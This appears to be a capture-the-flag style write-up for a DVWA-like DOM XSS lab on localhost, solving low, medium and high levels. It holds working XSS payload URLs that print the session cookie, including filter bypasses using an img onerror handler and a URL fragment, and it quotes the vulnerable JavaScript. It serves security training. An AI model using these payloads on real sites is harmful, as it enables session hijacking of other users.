# XSS (DOM)

Objective

Run your own JavaScript in another user's browser, use this to steal the cookie
of a logged in user.

## low

Substitute inner text with our cookie.

```html
http://localhost:80/vulnerabilities/xss_d/?default=<script>document.write(document.cookie)</script>
```

> PHPSESSID=aakl7lkvbd0v7ltil3lju0ei92; security=low

## medium

It seems that our input is put under `<select>` and `<option>` tag.  
There's also a filter to find and delete `<script>` contents.  

```html
http://localhost:80/vulnerabilities/xss_d/?default=</option></select><img src="" onerror="javascript:document.write(document.cookie)">
```

> PHPSESSID=aakl7lkvbd0v7ltil3lju0ei92; security=medium

## high

In the high level our input is nicely filtered, but from the javascript in
`<select>` we can know that it reads the whole substring after `default=`.  
So if we disguise our code as an anchor, it should work well as php `_GET` only
reads the string before #.

vulnerable javascript in `<select>`:
```javascript
if (document.location.href.indexOf("default=") >= 0) {
	var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
	document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
}
```

```html
http://localhost:80/vulnerabilities/xss_d/?default=English#<script>document.write(document.cookie)</script>
```

> PHPSESSID=aakl7lkvbd0v7ltil3lju0ei92; security=high
